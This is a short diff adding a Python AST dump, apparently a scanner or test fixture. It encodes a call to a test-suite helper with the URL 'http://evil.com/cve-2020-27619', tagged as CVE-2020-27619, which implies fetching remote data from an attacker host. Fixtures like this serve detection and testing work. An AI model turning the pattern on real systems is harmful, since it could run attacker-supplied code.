@@ -1,0 +1,20 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='test.multibytecodec_support', asname='mbc_support')]),
+        Assign(
+            targets=[
+                Name(id='url', ctx=Store())],
+            value=Constant(value='http://evil.com/cve-2020-27619')),
+        Expr(
+            value=Call(
+                func=Attribute(
+                    value=Name(id='mbc_support', ctx=Load()),
+                    attr='test_decode_refex',
+                    ctx=Load()),
+                args=[
+                    Constant(value='euc_kr'),
+                    Name(id='url', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
